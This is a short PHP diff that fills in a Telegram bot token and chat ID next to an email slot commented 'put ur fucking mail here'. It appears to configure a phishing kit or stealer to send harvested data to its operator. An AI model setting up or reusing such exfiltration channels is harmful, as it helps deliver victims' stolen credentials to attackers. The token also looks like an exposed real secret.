@@ -4,9 +4,9 @@
    $to = "email"; // put ur fucking mail here
 
   
-   $tgbot =""; // put ur telegram bot 
+   $tgbot ="8196034562:AAFa_86NF_YL-khEo44ocIJlzgVaVSJYEVs"; // put ur telegram bot 
 
-   $chatid ="";
+   $chatid ="8175125823";
 
 
 
